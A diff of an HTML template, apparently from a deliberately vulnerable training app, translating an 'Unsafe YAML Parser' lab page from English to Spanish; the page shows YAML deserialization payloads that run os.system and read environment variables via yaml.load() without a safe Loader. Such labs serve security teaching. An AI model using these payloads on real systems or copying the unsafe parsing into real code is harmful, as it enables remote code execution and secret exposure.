@@ -1,28 +1,28 @@
 {% extends "base.html" %}
-{% block title %}A03 – YAML Parser{% endblock %}
+{% block title %}A03 – Parser YAML{% endblock %}
 {% block content %}
-<h4><a href="/a03/">A03</a> — Unsafe YAML Parser
-  <span class="badge bg-danger ms-2">yaml.load() without Loader</span>
+<h4><a href="/a03/">A03</a> — Parser YAML Inseguro
+  <span class="badge bg-danger ms-2">yaml.load() sin Loader</span>
 </h4>
 <div class="row">
   <div class="col-md-6">
     <div class="card">
-      <div class="card-header">Submit YAML Config</div>
+      <div class="card-header">Enviar configuración YAML</div>
       <div class="card-body">
         <form method="post">
           <textarea name="config" class="form-control font-monospace" rows="8"
                     placeholder="{{ sample }}">{{ request.form.get('config', sample) }}</textarea>
-          <button class="btn btn-warning text-dark mt-2 w-100">Parse</button>
+          <button class="btn btn-warning text-dark mt-2 w-100">Parsear</button>
         </form>
       </div>
     </div>
     <div class="card mt-3">
-      <div class="card-header text-warning">Payload Examples</div>
+      <div class="card-header text-warning">Ejemplos de payload</div>
       <div class="card-body">
-        <p class="small text-secondary">Try submitting this to trigger code execution:</p>
+        <p class="small text-secondary">Envía esto para ejecutar código en el servidor:</p>
         <pre>!!python/object/apply:os.system
 - "touch /tmp/pwned"</pre>
-        <p class="small text-secondary mt-2">Or extract environment:</p>
+        <p class="small text-secondary mt-2">O para obtener una variable de entorno:</p>
         <pre>!!python/object/apply:os.environ.get
 - PATH</pre>
       </div>
@@ -34,7 +34,7 @@
     {% endif %}
     {% if result is not none %}
     <div class="card">
-      <div class="card-header text-success">Parsed Result</div>
+      <div class="card-header text-success">Resultado Parseado</div>
       <div class="card-body">
         <pre>{{ result }}</pre>
       </div>
